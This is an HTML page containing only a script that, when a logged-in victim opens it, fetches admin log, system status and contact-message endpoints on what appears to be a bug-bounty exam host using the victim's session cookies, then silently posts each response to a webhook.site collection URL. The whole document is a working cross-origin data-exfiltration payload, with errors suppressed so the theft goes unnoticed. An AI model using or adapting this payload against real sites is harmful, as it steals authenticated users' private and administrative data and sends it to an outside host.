<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
        const base = "https://api-bugbounty-exam.hashacademy.co";
        const msgId = "69ea4208bee6d6b7c6645889";

        const paths = [
            "/api/v1/admin/logs",
            "/api/admin/system/status",
            `/api/v1/contact/messages/${msgId}`
        ];

        paths.forEach(path => {
            fetch(base + path, { credentials: "include" })
                .then(r => r.text())
                .then(data => {
                    fetch(webh, {
                        method: "POST",
                        body: JSON.stringify({ path: path, data: data })
                    });
                })
                .catch(e => {});
        });
    </script>
</body>
